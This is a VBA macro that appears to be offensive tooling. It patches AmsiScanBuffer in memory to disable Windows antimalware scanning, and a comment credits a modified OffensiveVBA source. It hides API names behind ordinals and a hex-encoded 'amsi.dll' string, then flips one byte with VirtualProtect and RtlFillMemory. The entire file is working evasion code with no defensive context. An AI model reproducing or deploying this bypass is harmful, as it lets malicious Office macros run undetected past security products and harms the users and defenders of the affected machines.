'Tested in win 11
'Modded from https://github.com/S3cur3Th1sSh1t/OffensiveVBA/blob/main/src/AMSIBypass_AmsiScanBuffer_ordinal.vba
'GetProcessAddress
'The ordinal number is different from each windows version
Private Declare PtrSafe Function GPA Lib "kernel32" _
                 Alias "#718" ( _
                 ByVal hModule As LongPtr, _
                 ByVal lpProcName As LongPtr) As LongPtr

'LoadLibrary
Private Declare PtrSafe Function LL Lib "kernel32" _
                 Alias "#997" ( _
                 ByVal lpLibFileName As String) As LongPtr
'VirtualProtect
Private Declare PtrSafe Function VPM Lib "kernel32" Alias "#1542" (lpAddress As Any, ByVal dwSize As LongPtr, ByVal flNewProtect As LongPtr, lpflOldProtect As LongPtr) As LongPtr

'RTLFillMemory
Private Declare PtrSafe Sub Swapper Lib "kernel32.dll" Alias "#1275" (Destination As Any, ByVal Length As LongPtr, ByVal Fill As Byte)

Sub Use()
    Dim hMod As LongPtr
    Dim size As LongPtr
    
    Dim AsString_OrdinalNumber As LongPtr
    Dim AsString_FuncPointer As LongPtr
    
    Dim AsBuffer_OrdinalNumber As LongPtr
    Dim AsBuffer_FuncPointer As LongPtr
        
    Dim hexStr As String
    Dim AsString_LibName As String
    Dim i As Integer

    'LL = LoadLibrary
    hMod_1 = LL("advapi32.dll")

    hexStr = "616d73692e646c6c" ' amsi.dll

    For i = 1 To Len(hexStr) Step 2
        AsString_LibName = AsString_LibName & Chr(CLng("&H" & Mid(hexStr, i, 2)))
    Next i
    
    hMod = LL(AsString_LibName)

    AsBuffer_OrdinalNumber = 5
    'GPA = GetProcessAddress
    AsBuffer_FuncPointer = GPA(hMod, AsBuffer_OrdinalNumber)
    'Debug.Print hex(AsBuffer_FuncPointer)

    'VPM = VirtualProtectMemory
    a = VPM(ByVal (AsBuffer_FuncPointer + 132), 1, 64, 0)
    'Swapper = RTLFillMemory
    Swapper ByVal (AsBuffer_FuncPointer + 132), 1, Val("&H" & "75")

    hMod_2 = LL("kernel32" + ".dll")
    MsgBox "End"
End Sub


